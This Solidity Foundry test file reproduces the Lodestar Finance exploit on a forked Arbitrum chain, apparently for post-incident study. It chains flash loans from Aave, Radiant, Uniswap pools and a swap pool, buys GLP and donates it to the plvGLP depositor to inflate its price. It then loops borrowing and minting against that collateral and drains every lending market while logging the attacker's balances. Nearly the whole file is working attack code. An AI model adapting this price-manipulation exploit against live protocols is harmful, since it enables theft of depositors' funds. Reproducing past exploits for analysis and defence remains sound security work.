// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/SolidityFinance/status/1601684150456438784
// https://blog.lodestarfinance.io/post-mortem-summary-13f5fe0bb336
// @TX
// https://arbiscan.io/tx/0xc523c6307b025ebd9aef155ba792d1ba18d5d83f97c7a846f267d3d9a3004e8c

interface uniswapV3Flash {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface GMXRouter {
    function swapETHToTokens(address[] memory _path, uint256 _minOut, address _receiver) external payable;
    function swap(address[] memory _path, uint256 _amountIn, uint256 _minOut, address _receiver) external;
}

interface GMXReward {
    function mintAndStakeGlpETH(uint256 _minUsdg, uint256 _minGlp) external payable returns (uint256);
    function mintAndStakeGlp(
        address _token,
        uint256 _amount,
        uint256 _minUsdg,
        uint256 _minGlp
    ) external returns (uint256);
}

interface SwapFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface GlpDepositor {
    function donate(uint256 _amount) external;
    function redeem(uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
    IERC20 sGLP = IERC20(0x2F546AD4eDD93B956C8999Be404cdCAFde3E89AE);
    IERC20 MIM = IERC20(0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A);
    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 PlvGlpToken = IERC20(0x5326E71Ff593Ecc2CF7AcaE5Fe57582D6e74CFF1);
    IAaveFlashloan AaveFlash = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan Radiant = IAaveFlashloan(0x2032b9A8e9F7e76768CA9271003d3e43E1616B1F);
    uniswapV3Flash UniV3Flash1 = uniswapV3Flash(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    uniswapV3Flash UniV3Flash2 = uniswapV3Flash(0x50450351517117Cb58189edBa6bbaD6284D45902);
    uniswapV3Flash UniV3Flash3 = uniswapV3Flash(0x13398E27a21Be1218b6900cbEDF677571df42A48);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x905dfCD5649217c42684f23958568e533C711Aa3);
    GMXRouter Router = GMXRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);
    GMXReward Reward = GMXReward(0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1);
    IUnitroller unitroller = IUnitroller(0x8f2354F9464514eFDAe441314b8325E97Bf96cdc);
    ICErc20Delegate IUSDC = ICErc20Delegate(0x5E3F2AbaECB51A182f05b4b7c0f7a5da1942De90);
    ICErc20Delegate lplvGLP = ICErc20Delegate(0xCC25daC54A1a62061b596fD3Baf7D454f34c56fF);
    ICErc20Delegate IETH = ICErc20Delegate(0xb4d58C1F5870eFA4B05519A72851227F05743273);
    ICErc20Delegate IMIM = ICErc20Delegate(0x46178d84339A04f140934EE830cDAFDAcD29Fba9);
    ICErc20Delegate IUSDT = ICErc20Delegate(0xeB156f76Ef69be485c18C297DeE5c45390345187);
    ICErc20Delegate IFRAX = ICErc20Delegate(0x5FfA22244D8273d899B6C20CEC12A88a7Cd9E460);
    ICErc20Delegate IDAI = ICErc20Delegate(0x7a668F56AffD511FFc83C31666850eAe9FD5BCC8);
    ICErc20Delegate IWBTC = ICErc20Delegate(0xD2835B08795adfEfa0c2009B294ae84B08C6a67e);
    SwapFlashLoan swapFlashLoan = SwapFlashLoan(0x401AFbc31ad2A3Bc0eD8960d63eFcDEA749b4849);
    GlpDepositor depositor = GlpDepositor(0x13F0D29b5B83654A200E4540066713d50547606E);
    address GlpManager = 0x321F653eED006AD1C29D174e17d96351BDe22649;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("arbitrum", 45_121_903);
        cheats.label(address(USDC), "USDC");
        cheats.label(address(DAI), "DAI");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(FRAX), "FRAX");
        cheats.label(address(sGLP), "sGLP");
        cheats.label(address(MIM), "MIM");
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(PlvGlpToken), "PlvGlpToken");
        cheats.label(address(AaveFlash), "AaveFlash");
        cheats.label(address(Radiant), "Radiant");
        cheats.label(address(UniV3Flash1), "UniV3Flash1");
        cheats.label(address(UniV3Flash2), "UniV3Flash2");
        cheats.label(address(UniV3Flash3), "UniV3Flash3");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
        cheats.label(address(Reward), "Reward");
        cheats.label(address(unitroller), "unitroller");
        cheats.label(address(IUSDC), "IUSDC");
        cheats.label(address(lplvGLP), "lplvGLP");
        cheats.label(address(IETH), "IETH");
        cheats.label(address(IMIM), "IMIM");
        cheats.label(address(IUSDT), "IUSDT");
        cheats.label(address(IFRAX), "IFRAX");
        cheats.label(address(IDAI), "IDAI");
        cheats.label(address(IWBTC), "IWBTC");
        cheats.label(address(swapFlashLoan), "swapFlashLoan");
        cheats.label(address(depositor), "depositor");
        cheats.label(GlpManager, "GlpManager");
    }

    function testExploit() external {
        address[] memory assets = new address[](3);
        assets[0] = address(USDC);
        assets[1] = address(WETH);
        assets[2] = address(DAI);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 17_290_000 * 1e6;
        amounts[1] = 9500 * 1e18;
        amounts[2] = 406_316 * 1e18;
        uint256[] memory modes = new uint[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;
        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);

        emit log_named_decimal_uint(
            "Attacker PlvGlpToken balance after exploit", PlvGlpToken.balanceOf(address(this)), PlvGlpToken.decimals()
        );
        console.log("Attacker swap all PlvGlpToken to about 4500 ETH");
        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
        emit log_named_decimal_uint("Attacker MIM balance after exploit", MIM.balanceOf(address(this)), MIM.decimals());
        emit log_named_decimal_uint(
            "Attacker FRAX balance after exploit", FRAX.balanceOf(address(this)), FRAX.decimals()
        );
        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
        emit log_named_decimal_uint(
            "Attacker WBTC balance after exploit", WBTC.balanceOf(address(this)), WBTC.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        if (msg.sender == address(AaveFlash)) {
            USDC.approve(address(AaveFlash), type(uint256).max);
            WETH.approve(address(AaveFlash), type(uint256).max);
            DAI.approve(address(AaveFlash), type(uint256).max);
            address[] memory assets = new address[](1);
            assets[0] = address(USDC);
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = 14_435_000 * 1e6;
            uint256[] memory modes = new uint[](1);
            modes[0] = 0;
            Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(1), 0);
            return true;
        } else if (msg.sender == address(Radiant)) {
            USDC.approve(address(Radiant), type(uint256).max);
            UniV3Flash1.flash(address(this), 5460 * 1e18, 7_170_000 * 1e6, new bytes(1));
            return true;
        }
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == address(UniV3Flash1)) {
            UniV3Flash2.flash(address(this), 0, 2_200_000 * 1e6, new bytes(1));
            USDC.transfer(address(UniV3Flash1), 7_173_631 * 1e6);
            USDC.approve(address(Router), 19_012_632 * 1e6);
            address[] memory path = new address[](2);
            path[0] = address(USDC);
            path[1] = address(WETH);
            Router.swap(path, 19_012_632 * 1e6, 8000 * 1e18, address(this));
            WETH.transfer(address(UniV3Flash1), 5463 * 1e18);
        } else if (msg.sender == address(UniV3Flash2)) {
            Pair.swap(0, 10_000_000 * 1e6, address(this), new bytes(1));
            USDC.transfer(address(UniV3Flash2), 2_201_111 * 1e6);
        } else if (msg.sender == address(UniV3Flash3)) {
            swapFlashLoan.flashLoan(address(this), address(FRAX), 361_037 * 1e18, new bytes(1));
            USDT.transfer(address(UniV3Flash3), 397_256 * 1e6);
            USDC.transfer(address(UniV3Flash3), 1_610_460 * 1e6);
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        WETH.withdraw(WETH.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);
        Router.swapETHToTokens{value: 14_960 ether}(path, 18_890_000 * 1e6, address(this)); // 14,960 WETH for 19,001,512 USDC
        USDC.approve(address(IUSDC), USDC.balanceOf(address(this)));
        IUSDC.mint(USDC.balanceOf(address(this))); // 70M USDC
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(IUSDC);
        unitroller.enterMarkets(cTokens);
        uint256 PlvGlpTokenAmount = PlvGlpToken.balanceOf(address(lplvGLP));
        PlvGlpToken.approve(address(lplvGLP), type(uint256).max);
        for (uint256 i = 0; i < 16; i++) {
            lplvGLP.borrow(PlvGlpTokenAmount);
            lplvGLP.mint(PlvGlpTokenAmount);
        }
        lplvGLP.borrow(PlvGlpTokenAmount);
        deal(address(lplvGLP), address(0), 3_051_070_161 * 1e8); // the exploiter' balance
        cheats.startPrank(address(0));
        lplvGLP.transfer(address(this), lplvGLP.balanceOf(address(this)));
        cheats.stopPrank();
        UniV3Flash3.flash(address(this), 397_054 * 1e6, 1_609_646 * 1e6, new bytes(1));
        USDC.transfer(address(Pair), 10_030_500 * 1e6);
    }

    function executeOperation(
        address pool,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external payable {
        uint256 ETHglpAmount = Reward.mintAndStakeGlpETH{value: 1580 ether}(1_836_000 * 1e18, 2_156_500 * 1e18);
        FRAX.approve(GlpManager, FRAX.balanceOf(address(this)));
        uint256 FRAXglpAmount =
            Reward.mintAndStakeGlp(address(FRAX), FRAX.balanceOf(address(this)), 300_000 * 1e18, 361_000 * 1e18);
        USDC.approve(GlpManager, USDC.balanceOf(address(this)));
        uint256 USDCglpAmount =
            Reward.mintAndStakeGlp(address(USDC), USDC.balanceOf(address(this)), 1_500_000 * 1e18, 1_757_500 * 1e18);
        DAI.approve(GlpManager, DAI.balanceOf(address(this)));
        uint256 DAIglpAmount =
            Reward.mintAndStakeGlp(address(DAI), DAI.balanceOf(address(this)), 390_000 * 1e18, 399_000 * 1e18);
        USDT.approve(GlpManager, USDT.balanceOf(address(this)));
        uint256 USDTglpAmount =
            Reward.mintAndStakeGlp(address(USDT), USDT.balanceOf(address(this)), 350_000 * 1e18, 427_500 * 1e18);

        uint256 glpAmount = ETHglpAmount + FRAXglpAmount + USDCglpAmount + DAIglpAmount + USDTglpAmount;
        sGLP.approve(address(depositor), glpAmount);
        depositor.donate(glpAmount); // plvGLP price manipulation

        address[] memory cTokens = new address[](1);
        cTokens[0] = address(lplvGLP);
        unitroller.enterMarkets(cTokens);
        borrowAll();
        address(WETH).call{value: 125 ether}("");
        FRAX.transfer(address(swapFlashLoan), 361_327 * 1e18);
    }

    function borrowAll() internal {
        IUSDC.borrow(USDC.balanceOf(address(IUSDC)));
        IETH.borrow(address(IETH).balance);
        IMIM.borrow(MIM.balanceOf(address(IMIM)));
        IUSDT.borrow(USDT.balanceOf(address(IUSDT)));
        IFRAX.borrow(FRAX.balanceOf(address(IFRAX)));
        IDAI.borrow(DAI.balanceOf(address(IDAI)));
        IWBTC.borrow(WBTC.balanceOf(address(IWBTC)));
    }

    receive() external payable {}
}
